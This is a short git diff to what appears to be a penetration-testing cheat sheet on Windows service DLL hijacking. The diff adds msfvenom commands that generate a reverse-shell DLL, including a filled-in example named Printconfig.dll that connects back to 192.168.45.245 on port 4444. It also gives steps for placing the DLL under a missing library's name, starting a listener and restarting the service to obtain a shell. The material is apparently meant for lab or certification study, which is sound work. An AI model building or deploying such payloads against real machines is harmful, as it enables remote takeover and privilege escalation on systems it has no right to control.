@@ -1000,7 +1000,9 @@ net start <service>
 2. Check whether you have write permissions in the directory associated with the service.
 ```bash
 # Create a reverse-shell
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll -o filename.dll
+# Example (Printconfig.dll)
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.245 LPORT=4444 -f dll -o Printconfig.dll)
 ```
 3. Copy it to victom machine and them move it to the service associated directory.(Make sure the dll name is similar to missing name)
 4. Start listener and restart service, you'll get a shell.
